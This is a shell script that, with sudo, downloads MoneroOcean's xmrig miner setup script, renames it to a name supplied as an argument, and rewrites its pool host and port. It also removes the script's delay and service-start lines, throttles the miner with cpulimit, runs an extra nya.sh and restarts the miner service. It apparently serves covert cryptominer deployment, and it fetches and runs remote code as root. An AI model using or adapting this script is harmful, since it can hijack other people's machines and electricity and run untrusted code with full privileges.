#!/bin/sh
sudo snap remove $6
download_full_link='https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh'
cpu_limit=$5
cpu_count=$(grep 'processor' /proc/cpuinfo | sort -u | wc -l)
cpu_hint=$(($cpu_count*$cpu_limit))
sudo wget $download_full_link -O ./$3
sudo chmod +x ./$3
sudo sed -i "s/gulf.moneroocean.stream/$1/g" ./$3
sudo sed -i "s/$1:'\$PORT'/$1:$2/" ./$3
sudo sed -i "s/sleep 15//" ./$3
sudo sed -i "s/sudo systemctl start moneroocean_miner.service//" ./$3
sudo apt-get update
sudo apt-get install -y cpulimit
sudo setsid cpulimit -e xmrig -l $cpu_hint -b
sudo bash ./nya.sh $4
sudo systemctl restart moneroocean_miner
